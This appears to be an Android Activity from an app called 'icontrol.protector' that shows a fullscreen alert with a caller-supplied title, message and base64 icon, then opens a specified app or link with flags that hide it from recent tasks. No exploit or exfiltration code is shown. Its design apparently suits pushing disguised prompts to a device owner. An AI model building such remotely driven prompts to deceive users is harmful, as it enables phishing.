package com.icontrol.protector;

import static com.icontrol.protector.UtliTools.getDrawableFromBase64;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Context;
import android.content.Intent;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;



import java.util.Locale;

public class AlertActivity extends Activity {

    private static  int Type;
    private static  String toopen;

    @Override
    protected void onCreate( Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        String Title = null ;
        String Msg = null ;

         Type = -1 ;
         toopen = null ;
        Context ctx = getApplicationContext();

        String icobase = MySettings.Read(ctx,Consts.Alertico,null) ;

        try {
            Intent intentnew = getIntent();
            if (intentnew.hasExtra("Title")){
                Title = intentnew.getStringExtra("Title");
            }

            if(intentnew.hasExtra("Msg")){
                Msg =  intentnew.getStringExtra("Msg");
            }


            if(intentnew.hasExtra("Type")){
                Type =  intentnew.getIntExtra("Type",0);
            }

            if(intentnew.hasExtra("toopen")){
                toopen =  intentnew.getStringExtra("toopen");
            }

        }catch (Exception a){
            a.printStackTrace();
            Type = -1;
            toopen= null;
        }

        if (toopen != null && Type != -1){

            requestWindowFeature(Window.FEATURE_NO_TITLE);

            getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                    WindowManager.LayoutParams.FLAG_FULLSCREEN);

            Drawable icon;
            try {
                // null;
                icon = getDrawableFromBase64(icobase,ctx);

            } catch (Exception ex) {
                icon = null;
            }
            String buttonnameOK = "OK";

            String CurrnetLanuage = Locale.getDefault().getLanguage();
            switch (CurrnetLanuage) {
                case "en":
                    buttonnameOK = "ok";

                    break;
                case "ar":
                    buttonnameOK = "موافق";

                    break;
                case "zh":
                    buttonnameOK = "好的";

                    break;
                case "tr":
                    buttonnameOK = "Tamam";

                    break;
                default:
                    buttonnameOK = "OK";
                    break;

            }
            AlertDialog.Builder builder = new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert)
                    .setTitle(Title)
                    .setMessage(Msg)
                    .setPositiveButton(buttonnameOK, (dialog, which) -> {
                        Intent intent = null;
                        switch (Type){
                            case 1:
                            {
                                intent = new Intent(ctx, BrodcastActivity.class);

                                intent.putExtra("type", "app");
                                intent.putExtra("tolunch", toopen);

                            }
                            break;
                            case 2:
                            {
                                intent = new Intent(ctx, BrodcastActivity.class);
                                if (!toopen.startsWith("http://") && !toopen.startsWith("https://")){
                                    toopen = "http://" + toopen;
                                }

                                intent.putExtra("type", "link");
                                intent.putExtra("tolunch", toopen);

                            }
                            break;
                            default:
                                dialog.dismiss();
                                break;
                        }
                        if(intent != null){
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                            intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                            intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);


                            dialog.dismiss();
                            ctx.startActivity(intent);
                        }
                        AlertActivity.this.finish();
                    });

            if (icon != null) {
                builder.setIcon(icon);
            }


            builder.show();


        }


    }
//    @Override
//    public void finish() {
//        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
//            super.finishAndRemoveTask();
//        }
//        else {
//            super.finish();
//        }
//    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
